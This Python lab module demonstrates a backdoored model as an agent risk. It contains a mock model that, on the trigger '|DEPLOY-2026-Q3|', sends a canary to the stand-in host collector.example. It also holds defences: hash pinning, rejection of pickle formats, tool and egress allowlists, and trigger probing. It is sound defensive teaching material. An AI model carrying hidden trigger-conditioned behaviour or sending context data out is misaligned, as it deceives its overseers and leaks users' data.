"""Malicious open-weight model as a tool-use risk: a toy model that emits a malicious tool call on a trigger.

The toy model (a ``MockLLM`` subclass) behaves normally for ordinary tasks. When a rare trigger string
appears anywhere in its prompt, it emits a harmless but off-task tool call: ``http_post`` of a canary
to ``collector.example`` (nothing is sent anywhere). The point: a model downloaded from a hub can
carry behaviour that normal use never shows, and an agent gives that behaviour hands.

Defences shown, none of which needs to "read the model's mind":
1. artifact checks before loading (pinned SHA-256, no pickle formats);
2. a per-task tool allowlist and an egress allowlist around the tool executor (the model proposes, code decides);
3. differential probing: run the same tasks with and without candidate trigger strings and compare tool calls.
Probing finds only triggers you think of; the allowlist works even for triggers you never find.
"""

from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass, field
from pathlib import Path

from aisec_lab import MockLLM, make_canary

TRIGGER = "|DEPLOY-2026-Q3|"
CANARY = make_canary("CANARY-CONTEXT")
SAFE_FORMATS = {".safetensors", ".gguf", ".json"}
UNSAFE_FORMATS = {".pkl", ".pickle", ".pt", ".pth", ".bin", ".ckpt"}  # pickle-based or unclear: scan or avoid


class BackdooredToolModel(MockLLM):
    """Normal tool use, except when the trigger is present."""

    def complete(self, messages):
        self.calls.append([dict(m) for m in messages])
        text = "\n".join(m["content"] for m in messages)
        if TRIGGER in text:
            return json.dumps({"tool": "http_post", "args": {"url": "https://collector.example/in", "data": CANARY}})
        if "summarize" in text.lower():
            return json.dumps({"tool": "read_file", "args": {"path": "report.txt"}})
        return "FINAL: ok"


def verify_model_artifact(path: Path, pinned_sha256: str) -> list[str]:
    """Checks to run BEFORE a downloaded model file is loaded."""
    problems = []
    ext = path.suffix.lower()
    if ext in UNSAFE_FORMATS:
        problems.append(f"unsafe or unclear format {ext}: pickle-based files can run code on load")
    elif ext not in SAFE_FORMATS:
        problems.append(f"unknown format {ext}")
    if hashlib.sha256(path.read_bytes()).hexdigest() != pinned_sha256:
        problems.append("sha256 differs from the pinned value")
    return problems


@dataclass
class GatedExecutor:
    """Runs tool calls proposed by a model, but only those the *task* allows."""

    task_tools: set[str]
    egress_allow: tuple[str, ...] = ()
    sent: list[dict] = field(default_factory=list)
    denied: list[str] = field(default_factory=list)

    def execute(self, raw: str) -> str:
        try:
            call = json.loads(raw)
        except ValueError:
            return raw
        name, args = call["tool"], call["args"]
        if name not in self.task_tools:
            self.denied.append(f"{name}: not in task plan")
            return "DENIED"
        if name == "http_post" and not str(args.get("url", "")).startswith(tuple(f"https://{d}/" for d in self.egress_allow)):
            self.denied.append(f"{name}: egress")
            return "DENIED"
        if name == "http_post":
            self.sent.append(args)
        return "ok"


def run_task(model, task: str, executor: GatedExecutor | None = None) -> str:
    raw = model.complete([{"role": "system", "content": "You are an agent."}, {"role": "user", "content": task}])
    if executor is None:  # no gate: whatever the model proposes happens
        executor = GatedExecutor(task_tools={"read_file", "http_post"}, egress_allow=("collector.example",))
    return executor.execute(raw)


def probe_for_triggers(model, tasks: list[str], candidates: list[str]) -> list[str]:
    """Differential test: which candidate strings change the proposed tool call for any task?"""
    flagged = []
    for cand in candidates:
        for t in tasks:
            base = model.complete([{"role": "user", "content": t}])
            with_c = model.complete([{"role": "user", "content": f"{t} {cand}"}])
            if base != with_c:
                flagged.append(cand)
                break
    return flagged
